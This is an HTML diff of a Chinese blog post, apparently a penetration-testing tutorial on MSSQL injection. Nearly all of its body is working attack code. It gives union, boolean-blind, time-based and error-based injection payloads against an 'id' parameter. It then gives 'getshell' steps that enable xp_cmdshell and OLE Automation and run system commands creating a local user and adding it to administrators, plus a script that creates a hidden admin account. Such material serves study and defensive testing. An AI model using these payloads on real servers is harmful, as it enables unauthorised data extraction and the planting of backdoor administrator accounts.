@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="mssql数据库mssql注入语句，以及getshell方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSSQL注入">
+<meta property="og:url" content="http://example.com/2021/09/19/MSSQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="mssql数据库mssql注入语句，以及getshell方法">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-09-19T14:50:44.000Z">
+<meta property="article:modified_time" content="2021-09-19T15:00:00.052Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2021/09/19/MSSQL%E6%B3%A8%E5%85%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2021/09/19/MSSQL%E6%B3%A8%E5%85%A5/","path":"2021/09/19/MSSQL注入/","title":"MSSQL注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>MSSQL注入 | Hexo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hexo</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mssql%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.</span> <span class="nav-text">mssql数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mssql%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">mssql简介</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E5%88%A4%E6%96%AD"><span class="nav-number">2.1.</span> <span class="nav-text">权限判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">2.2.</span> <span class="nav-text">联合查询</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">2.2.1.</span> <span class="nav-text">获取数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="nav-number">2.2.2.</span> <span class="nav-text">获取表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="nav-number">2.2.3.</span> <span class="nav-text">获取列名</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.3.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.</span> <span class="nav-text">延时注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.5.</span> <span class="nav-text">报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mssql-getshell"><span class="nav-number">3.</span> <span class="nav-text">mssql_getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xp-cmdshell"><span class="nav-number">3.1.</span> <span class="nav-text">xp_cmdshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sp-oacreate"><span class="nav-number">3.2.</span> <span class="nav-text">sp_oacreate</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/hqz66" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hqz66" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/z1219089065@163.com" title="E-Mail → z1219089065@163.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/19/MSSQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MSSQL注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-09-19 22:50:44 / 修改时间：23:00:00" itemprop="dateCreated datePublished" datetime="2021-09-19T22:50:44+08:00">2021-09-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="mssql数据库"><a href="#mssql数据库" class="headerlink" title="mssql数据库"></a>mssql数据库</h2><p>mssql注入语句，以及getshell方法</p>
+<span id="more"></span>
+
+<h3 id="mssql简介"><a href="#mssql简介" class="headerlink" title="mssql简介"></a>mssql简介</h3><ul>
+<li>mssql默认端口1433，</li>
+<li>mssql自带4个系统数据库master、model、msdb、tempdb，和2个实例数据库ReportServer、ReportServerTempDB</li>
+<li>其中系统数据库master最重要，记录了mssql的各种对象信息</li>
+<li>每个数据库都有sysobjects、syscolumns，syscolumns中name是列名，sysobjects三个属性最为重要<ul>
+<li>name：表名</li>
+<li>xtype：表的类型，U为用户表，S为系统表</li>
+<li>id：用于连接sysobjects表名和syscolumns的列名</li>
+</ul>
+</li>
+<li>与mysql类似，sql server中每个数据库都有information_schema视图，可从中查询表名和列名等信息</li>
+<li>注释符–和/**/</li>
+<li>mssql三个权限：<ul>
+<li>sa：mssql最高权限</li>
+<li>db：管理员权限</li>
+<li>public：普通用户权限</li>
+</ul>
+</li>
+</ul>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="权限判断"><a href="#权限判断" class="headerlink" title="权限判断"></a>权限判断</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># sa权限</span><br><span class="line"><span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br><span class="line"># db权限</span><br><span class="line"><span class="keyword">select</span> is_member(<span class="string">&#x27;db_owner&#x27;</span>);</span><br><span class="line"># public权限</span><br><span class="line"><span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;public&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><h4 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><p>master的sysdatabases表保存着所有数据库的信息，从中获取数据库名，dbid表示数据库编号，从零开始</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 获取当前数据库名</span><br><span class="line"><span class="keyword">select</span> db_name();</span><br><span class="line"># 读取sysdatabases</span><br><span class="line"><span class="keyword">select</span> quotename(name) <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> dbid<span class="operator">&gt;</span><span class="number">4</span> <span class="keyword">for</span> xml path;</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 读取information_schema表</span><br><span class="line"><span class="keyword">select</span> quotename(table_name) <span class="keyword">from</span> INFORMATION_SCHEMA.tables <span class="keyword">for</span> XML PATH(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"># 读取sysobjects</span><br><span class="line"><span class="keyword">select</span> quotename(name) <span class="keyword">from</span> test..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">for</span> xml path;</span><br></pre></td></tr></table></figure>
+<h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 读取information_schema</span><br><span class="line"><span class="keyword">select</span> quotename(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> <span class="keyword">for</span> xml path;</span><br><span class="line"># 读取syscolumns</span><br><span class="line"><span class="keyword">select</span> quotename(name) <span class="keyword">from</span> test..syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> test..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) <span class="keyword">for</span> xml path;</span><br></pre></td></tr></table></figure>
+
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>以获取表名为例</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 读取information_schema</span><br><span class="line">len((<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;table_1&#x27;</span>)))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;table_1&#x27;</span>)), <span class="number">1</span>, <span class="number">1</span>))<span class="operator">=</span><span class="number">117</span></span><br><span class="line"># 读取sysobject</span><br><span class="line">ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> test..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;table_1&#x27;</span>)), <span class="number">1</span>, <span class="number">1</span>))<span class="operator">=</span><span class="number">117</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>waitfor delay ‘0:0:5’，延时5秒</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 判断数据库名长度</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> if( len((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> dbid<span class="operator">&gt;</span><span class="number">6</span>))<span class="operator">&gt;</span><span class="number">3</span>  ) waitfor delay <span class="string">&#x27;0:0:5&#x27;</span> <span class="comment">--</span></span><br><span class="line"># 获取数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name  <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> dbid<span class="operator">&gt;</span><span class="number">6</span>), <span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">116</span>) waitfor delay <span class="string">&#x27;0:0:5&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>sql server在将nvarchar值转换成int类型时会失败，报错并将查询的值输出</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 获取当前数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(db_name())</span><br><span class="line"># 获取所有数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> quotename(name) <span class="keyword">from</span> master..sysdatabases <span class="keyword">FOR</span> XML PATH(<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"># 获取表名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> quotename(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">for</span> XML PATH(<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"># 获取列名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> quotename(name) <span class="keyword">from</span> test..syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> test..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) <span class="keyword">for</span> xml path)</span><br></pre></td></tr></table></figure>
+<h2 id="mssql-getshell"><a href="#mssql-getshell" class="headerlink" title="mssql_getshell"></a>mssql_getshell</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p>首先，判断xp_cmdshell存储过程是否存在，且一定要sa权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 判断xp_cmdshell是否存在，<span class="number">1</span>则存在，<span class="number">0</span>不存在</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> master.dbo.sysobjects <span class="keyword">where</span> xtype <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> name <span class="operator">=</span> <span class="string">&#x27;xp_cmdshell&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>开启xp_cmdshell，在SQL Server 2005之前版本中，xp_cmdshell是默认开启的，之后的版本中则默认禁止，如果有sa权限可以用sp_configure开启它</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 允许修改高级参数</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"># 打开xp_cmdshell扩展</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+<p>配置完成即可执行系统命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;net user hqz 123456 /add&#x27;</span>;</span><br><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;net localgroup administrators hqz /add&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><p>如果xp_cmdshell组件被删除了话，还可以使用COM组件的sp_oacreate来进行执行系统命令，前提有sa权限。首先判断其是否存在</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 判断sp_oacreate存在</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> master.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;SP_OACREATE&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>开启sp_oacreate</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; </span><br><span class="line">RECONFIGURE; </span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="number">1</span>; </span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 添加管理员账户</span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@js</span> <span class="type">int</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;ScriptControl&#x27;</span>,<span class="variable">@js</span> <span class="keyword">OUT</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_OASetProperty <span class="variable">@js</span>, <span class="string">&#x27;Language&#x27;</span>, <span class="string">&#x27;JavaScript&#x27;</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@js</span>, <span class="string">&#x27;Eval&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;var o=new ActiveXObject(&quot;Shell.Users&quot;);z=o.create(&quot;user&quot;);z.changePassword(&quot;pass&quot;,&quot;&quot;);z.setting(&quot;AccountType&quot;)=3;&#x27;</span></span><br><span class="line"></span><br><span class="line"># 执行系统命令</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span></span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>, <span class="variable">@shell</span> <span class="keyword">out</span></span><br><span class="line"><span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>, <span class="string">&#x27;run&#x27;</span> , <span class="keyword">null</span>, <span class="string">&#x27;cmd /c &quot;net user test 123456 /add&quot; &#x27;</span></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://f5.pm/go-26046.html">更多getshell方式</a></p>
+<p>参考链接</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1668918">https://cloud.tencent.com/developer/article/1668918</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/88679754">https://blog.csdn.net/qq_36119192/article/details/88679754</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/08/18/vulnstack-ATT&CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%B8%80/" rel="prev" title="vulnstack-ATT&CK红队实战靶场一">
+                  <i class="fa fa-chevron-left"></i> vulnstack-ATT&CK红队实战靶场一
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">44k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">40 分钟</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
